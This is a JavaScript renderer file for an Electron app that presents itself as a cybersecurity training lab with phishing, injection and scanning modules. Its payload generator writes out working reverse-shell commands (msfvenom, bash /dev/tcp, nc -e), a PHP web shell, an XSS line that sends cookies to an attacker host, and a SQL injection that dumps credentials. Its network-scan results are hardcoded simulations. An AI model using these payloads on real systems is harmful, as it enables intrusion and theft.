const { ipcRenderer } = require('electron');

class CyberLabUI {
    constructor() {
        this.currentSection = 'dashboard';
        this.serverRunning = false;
        this.labStats = {
            incidents: 0,
            sessions: 0,
            uptime: 0,
            connections: 0
        };
        
        this.init();
    }

    init() {
        this.setupEventListeners();
        this.loadSettings();
        this.checkServerStatus();
        this.startStatsUpdateInterval();
        this.initializeModules();
        
        // Listen for IPC events
        this.setupIPCListeners();
        
        console.log('🚀 GodBrain CyberLab UI initialized');
    }

    setupEventListeners() {
        // Navigation
        document.querySelectorAll('.nav-item').forEach(item => {
            item.addEventListener('click', () => {
                const section = item.dataset.section;
                this.showSection(section);
            });
        });

        // Server toggle
        document.getElementById('serverToggle').addEventListener('click', () => {
            this.toggleServer();
        });

        // Header actions
        document.getElementById('openBrowser').addEventListener('click', () => {
            this.openInBrowser();
        });

        document.getElementById('exportData').addEventListener('click', () => {
            this.exportLabData();
        });

        // Window controls
        window.addEventListener('beforeunload', () => {
            if (this.serverRunning) {
                ipcRenderer.invoke('stop-server');
            }
        });
    }

    setupIPCListeners() {
        // Server events
        ipcRenderer.on('server-started', () => {
            this.serverRunning = true;
            this.updateServerStatus();
            this.showNotification('Server started successfully', 'success');
        });

        ipcRenderer.on('server-stopped', () => {
            this.serverRunning = false;
            this.updateServerStatus();
            this.showNotification('Server stopped', 'warning');
        });

        ipcRenderer.on('server-log', (event, data) => {
            this.addLogEntry(data, 'info');
        });

        ipcRenderer.on('server-error', (event, error) => {
            this.addLogEntry(error, 'error');
            this.showNotification('Server error: ' + error, 'error');
        });

        // WebSocket events
        ipcRenderer.on('websocket-connected', () => {
            this.addLogEntry('WebSocket connected to lab server', 'success');
        });

        ipcRenderer.on('lab-update', (event, data) => {
            this.handleLabUpdate(data);
        });

        // Menu events
        ipcRenderer.on('new-session', () => {
            this.clearLabData();
        });

        ipcRenderer.on('export-data', () => {
            this.exportLabData();
        });

        ipcRenderer.on('clear-data', () => {
            this.clearLabData();
        });

        ipcRenderer.on('open-tool', (event, tool) => {
            this.openTool(tool);
        });
    }

    showSection(sectionName) {
        // Hide all sections
        document.querySelectorAll('.section').forEach(section => {
            section.classList.add('hidden');
        });

        // Show selected section
        const targetSection = document.getElementById(`${sectionName}-section`);
        if (targetSection) {
            targetSection.classList.remove('hidden');
            targetSection.classList.add('fade-in');
        }

        // Update navigation
        document.querySelectorAll('.nav-item').forEach(item => {
            item.classList.remove('active');
        });
        document.querySelector(`[data-section="${sectionName}"]`).classList.add('active');

        // Update page title
        const titles = {
            dashboard: 'Dashboard',
            modules: 'Training Modules',
            phishing: 'Phishing Laboratory',
            payloads: 'Payload Generator',
            network: 'Network Tools',
            logs: 'Activity Logs',
            settings: 'Settings'
        };
        document.getElementById('pageTitle').textContent = titles[sectionName] || 'GodBrain CyberLab';

        this.currentSection = sectionName;
    }

    async toggleServer() {
        const button = document.getElementById('serverToggle');
        button.disabled = true;

        try {
            if (this.serverRunning) {
                await ipcRenderer.invoke('stop-server');
            } else {
                const started = await ipcRenderer.invoke('start-server');
                if (started) {
                    this.addLogEntry('Server started on port 5000', 'success');
                } else {
                    this.showNotification('Failed to start server', 'error');
                }
            }
        } catch (error) {
            this.showNotification('Server error: ' + error.message, 'error');
        } finally {
            button.disabled = false;
        }
    }

    updateServerStatus() {
        const statusDot = document.getElementById('statusDot');
        const statusText = document.getElementById('statusText');
        const toggleButton = document.getElementById('serverToggle');

        if (this.serverRunning) {
            statusDot.classList.add('online');
            statusText.textContent = 'Server Online';
            toggleButton.innerHTML = '⏹️ Stop Server';
            toggleButton.className = 'btn btn-danger';
        } else {
            statusDot.classList.remove('online');
            statusText.textContent = 'Server Offline';
            toggleButton.innerHTML = '▶️ Start Server';
            toggleButton.className = 'btn btn-primary';
        }
    }

    async checkServerStatus() {
        try {
            this.serverRunning = await ipcRenderer.invoke('get-server-status');
            this.updateServerStatus();
        } catch (error) {
            console.error('Failed to check server status:', error);
        }
    }

    async loadSettings() {
        try {
            const settings = await ipcRenderer.invoke('get-settings');
            
            document.getElementById('httpPort').value = settings.serverPort || 5000;
            document.getElementById('httpsPort').value = settings.httpsPort || 5443;
            document.getElementById('autoStart').checked = settings.autoStart || false;
            document.getElementById('theme').value = settings.theme || 'dark';
            
            if (settings.autoStart && !this.serverRunning) {
                setTimeout(() => this.toggleServer(), 1000);
            }
        } catch (error) {
            console.error('Failed to load settings:', error);
        }
    }

    async saveSettings() {
        try {
            const settings = {
                serverPort: parseInt(document.getElementById('httpPort').value),
                httpsPort: parseInt(document.getElementById('httpsPort').value),
                autoStart: document.getElementById('autoStart').checked,
                theme: document.getElementById('theme').value
            };

            await ipcRenderer.invoke('save-settings', settings);
            this.showNotification('Settings saved successfully', 'success');
        } catch (error) {
            this.showNotification('Failed to save settings: ' + error.message, 'error');
        }
    }

    startStatsUpdateInterval() {
        setInterval(async () => {
            if (this.serverRunning) {
                try {
                    this.labStats = await ipcRenderer.invoke('get-lab-stats');
                    this.updateDashboardStats();
                } catch (error) {
                    console.error('Failed to update lab stats:', error);
                }
            }
        }, 5000);
    }

    updateDashboardStats() {
        document.getElementById('totalIncidents').textContent = this.labStats.incidents || 0;
        document.getElementById('activeSessions').textContent = this.labStats.sessions || 0;
        document.getElementById('connections').textContent = this.labStats.connections || 0;
        
        // Format uptime
        const uptime = this.labStats.uptime || 0;
        const minutes = Math.floor(uptime / 60000);
        const hours = Math.floor(minutes / 60);
        const uptimeText = hours > 0 ? `${hours}h ${minutes % 60}m` : `${minutes}m`;
        document.getElementById('uptime').textContent = uptimeText;
    }

    initializeModules() {
        const modules = [
            {
                name: 'Phishing Demo',
                description: 'Interactive phishing awareness training with multiple attack vectors',
                status: 'Ready',
                icon: '🎣',
                action: () => this.showSection('phishing')
            },
            {
                name: 'SQL Injection',
                description: 'SQL injection attack simulation and prevention techniques',
                status: 'Ready',
                icon: '💉',
                action: () => this.openModule('sqli')
            },
            {
                name: 'XSS Playground',
                description: 'Cross-site scripting attack demonstrations and defenses',
                status: 'Ready',
                icon: '🔍',
                action: () => this.openModule('xss')
            },
            {
                name: 'MITM Simulation',
                description: 'Man-in-the-middle attack scenarios and detection methods',
                status: 'Ready',
                icon: '🎭',
                action: () => this.openModule('mitm')
            },
            {
                name: 'DDoS Simulation',
                description: 'Distributed denial of service attack simulation and mitigation',
                status: 'Ready',
                icon: '🌊',
                action: () => this.openModule('ddos')
            },
            {
                name: 'Keylogger Demo',
                description: 'Keylogger detection and prevention demonstration',
                status: 'Ready',
                icon: '⌨️',
                action: () => this.openModule('keylogger')
            },
            {
                name: 'Cookie Analysis',
                description: 'HTTP cookie security analysis and session management',
                status: 'Ready',
                icon: '🍪',
                action: () => this.openModule('cookies')
            },
            {
                name: 'Proxy Tools',
                description: 'HTTP proxy and traffic interception utilities',
                status: 'Ready',
                icon: '🔀',
                action: () => this.openModule('proxy')
            }
        ];

        const moduleGrid = document.getElementById('moduleGrid');
        moduleGrid.innerHTML = '';

        modules.forEach(module => {
            const moduleCard = document.createElement('div');
            moduleCard.className = 'module-card';
            moduleCard.innerHTML = `
                <div class="module-title">${module.icon} ${module.name}</div>
                <div class="module-description">${module.description}</div>
                <div class="module-status">
                    <span style="color: var(--success-color);">●</span>
                    <span>${module.status}</span>
                </div>
            `;
            
            moduleCard.addEventListener('click', module.action);
            moduleGrid.appendChild(moduleCard);
        });
    }

    openModule(moduleName) {
        if (!this.serverRunning) {
            this.showNotification('Please start the server first', 'warning');
            return;
        }

        const url = `http://localhost:5000/sim/${moduleName}`;
        ipcRenderer.invoke('open-external', url);
        this.addLogEntry(`Opened ${moduleName} module`, 'info');
    }

    launchPhishingDemo(type) {
        if (!this.serverRunning) {
            this.showNotification('Please start the server first', 'warning');
            return;
        }

        const url = `http://localhost:5000/sim/phish?type=${type}`;
        ipcRenderer.invoke('open-external', url);
        this.addLogEntry(`Launched ${type} phishing demo`, 'info');
    }

    generatePayload() {
        const payloadType = document.getElementById('payloadType').value;
        const platform = document.getElementById('targetPlatform').value;
        const lhost = document.getElementById('lhost').value;
        const lport = document.getElementById('lport').value;

        if (!lhost || !lport) {
            this.showNotification('Please fill in LHOST and LPORT', 'warning');
            return;
        }

        const payloadOutput = document.getElementById('payloadOutput');
        let payload = '';

        switch (payloadType) {
            case 'reverse-shell':
                if (platform === 'windows') {
                    payload = `msfvenom -p windows/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f exe > shell.exe`;
                } else if (platform === 'linux') {
                    payload = `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
                } else {
                    payload = `nc -e /bin/sh ${lhost} ${lport}`;
                }
                break;
            case 'web-shell':
                payload = `<?php system($_GET['cmd']); ?>`;
                break;
            case 'xss-payload':
                payload = `<script>document.location='http://${lhost}:${lport}/cookie.php?c='+document.cookie</script>`;
                break;
            case 'sql-injection':
                payload = `' OR 1=1 UNION SELECT username,password FROM users--`;
                break;
        }

        payloadOutput.style.display = 'block';
        payloadOutput.innerHTML = `<div class="log-entry success">Generated ${payloadType} payload:</div><div class="log-entry">${payload}</div>`;
        
        this.addLogEntry(`Generated ${payloadType} payload for ${platform}`, 'info');
    }

    startNetworkScan() {
        const targetRange = document.getElementById('targetRange').value;
        const scanType = document.getElementById('scanType').value;

        if (!targetRange) {
            this.showNotification('Please enter a target range', 'warning');
            return;
        }

        const scanResults = document.getElementById('scanResults');
        scanResults.style.display = 'block';
        scanResults.innerHTML = `<div class="log-entry info">Starting ${scanType} scan on ${targetRange}...</div>`;

        // Simulate scan results
        setTimeout(() => {
            let results = '';
            switch (scanType) {
                case 'ping':
                    results = `
                        <div class="log-entry success">192.168.1.1 - ONLINE (Gateway)</div>
                        <div class="log-entry success">192.168.1.100 - ONLINE</div>
                        <div class="log-entry success">192.168.1.101 - ONLINE</div>
                        <div class="log-entry">192.168.1.102 - TIMEOUT</div>
                        <div class="log-entry success">192.168.1.105 - ONLINE</div>
                    `;
                    break;
                case 'port':
                    results = `
                        <div class="log-entry success">192.168.1.100:22 - SSH OPEN</div>
                        <div class="log-entry success">192.168.1.100:80 - HTTP OPEN</div>
                        <div class="log-entry success">192.168.1.100:443 - HTTPS OPEN</div>
                        <div class="log-entry warning">192.168.1.100:3389 - RDP FILTERED</div>
                    `;
                    break;
                case 'service':
                    results = `
                        <div class="log-entry info">192.168.1.100:22 - OpenSSH 8.9</div>
                        <div class="log-entry info">192.168.1.100:80 - Apache 2.4.52</div>
                        <div class="log-entry info">192.168.1.100:443 - Apache 2.4.52 (SSL)</div>
                    `;
                    break;
                case 'vuln':
                    results = `
                        <div class="log-entry warning">CVE-2022-0847 - Dirty Pipe (Linux Kernel)</div>
                        <div class="log-entry error">CVE-2021-44228 - Log4Shell (Apache)</div>
                        <div class="log-entry success">No SSH vulnerabilities detected</div>
                    `;
                    break;
            }
            scanResults.innerHTML += results;
            this.addLogEntry(`${scanType} scan completed on ${targetRange}`, 'success');
        }, 2000);
    }

    openInBrowser() {
        if (!this.serverRunning) {
            this.showNotification('Please start the server first', 'warning');
            return;
        }
        ipcRenderer.invoke('open-external', 'http://localhost:5000');
    }

    async exportLabData() {
        try {
            const result = await ipcRenderer.invoke('export-lab-data');
            if (result.success) {
                this.showNotification(`Data exported to ${result.path}`, 'success');
            } else {
                this.showNotification('Export cancelled or failed', 'warning');
            }
        } catch (error) {
            this.showNotification('Export failed: ' + error.message, 'error');
        }
    }

    clearLabData() {
        if (!this.serverRunning) {
            this.showNotification('Server must be running to clear data', 'warning');
            return;
        }

        fetch('http://localhost:5000/api/clear', { method: 'DELETE' })
            .then(response => response.json())
            .then(data => {
                this.showNotification('Lab data cleared', 'success');
                this.addLogEntry('Lab data cleared by user', 'warning');
                this.labStats = { incidents: 0, sessions: 0, uptime: 0, connections: 0 };
                this.updateDashboardStats();
            })
            .catch(error => {
                this.showNotification('Failed to clear data: ' + error.message, 'error');
            });
    }

    clearLogs() {
        const logsContainer = document.getElementById('activityLogs');
        logsContainer.innerHTML = '<div class="log-entry info">[SYSTEM] Logs cleared</div>';
        this.showNotification('Activity logs cleared', 'success');
    }

    exportLogs() {
        const logs = document.getElementById('activityLogs').innerText;
        const blob = new Blob([logs], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        
        const a = document.createElement('a');
        a.href = url;
        a.download = `cyberlab-logs-${new Date().toISOString().split('T')[0]}.txt`;
        a.click();
        
        URL.revokeObjectURL(url);
        this.showNotification('Logs exported successfully', 'success');
    }

    generateSSLCerts() {
        this.addLogEntry('Generating SSL certificates...', 'info');
        this.showNotification('Generating SSL certificates... This may take a moment.', 'info');
        
        // This would be handled by the main process
        setTimeout(() => {
            this.addLogEntry('SSL certificates generated successfully', 'success');
            this.showNotification('SSL certificates generated successfully', 'success');
        }, 3000);
    }

    addLogEntry(message, type = 'info') {
        const logsContainer = document.getElementById('activityLogs');
        const timestamp = new Date().toLocaleTimeString();
        const logEntry = document.createElement('div');
        logEntry.className = `log-entry ${type}`;
        logEntry.textContent = `[${timestamp}] ${message}`;
        
        logsContainer.appendChild(logEntry);
        logsContainer.scrollTop = logsContainer.scrollHeight;
        
        // Keep only last 100 log entries
        while (logsContainer.children.length > 100) {
            logsContainer.removeChild(logsContainer.firstChild);
        }
    }

    handleLabUpdate(data) {
        switch (data.type) {
            case 'incident':
                this.addLogEntry(`New incident: ${data.data.type}`, 'warning');
                break;
            case 'traffic':
                this.addLogEntry(`Traffic: ${data.data.method} ${data.data.path}`, 'info');
                break;
            case 'phishing_capture':
                this.addLogEntry(`Phishing attempt captured from ${data.data.ip}`, 'error');
                break;
            case 'clear':
                this.addLogEntry('Lab data cleared remotely', 'warning');
                break;
        }
    }

    showNotification(message, type = 'info') {
        const notification = document.createElement('div');
        notification.className = `notification ${type}`;
        notification.textContent = message;
        
        document.body.appendChild(notification);
        
        setTimeout(() => {
            notification.remove();
        }, 5000);
    }

    openTool(toolName) {
        switch (toolName) {
            case 'network-scanner':
                this.showSection('network');
                break;
            case 'payload-generator':
                this.showSection('payloads');
                break;
            default:
                this.showNotification(`Tool ${toolName} not implemented yet`, 'warning');
        }
    }
}

// Global functions for HTML onclick handlers
window.openModule = function(moduleName) {
    cyberlabUI.openModule(moduleName);
};

window.launchPhishingDemo = function(type) {
    cyberlabUI.launchPhishingDemo(type);
};

window.generatePayload = function() {
    cyberlabUI.generatePayload();
};

window.startNetworkScan = function() {
    cyberlabUI.startNetworkScan();
};

window.clearLabData = function() {
    cyberlabUI.clearLabData();
};

window.clearLogs = function() {
    cyberlabUI.clearLogs();
};

window.exportLogs = function() {
    cyberlabUI.exportLogs();
};

window.saveSettings = function() {
    cyberlabUI.saveSettings();
};

window.generateSSLCerts = function() {
    cyberlabUI.generateSSLCerts();
};

// Initialize the UI when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    window.cyberlabUI = new CyberLabUI();
});
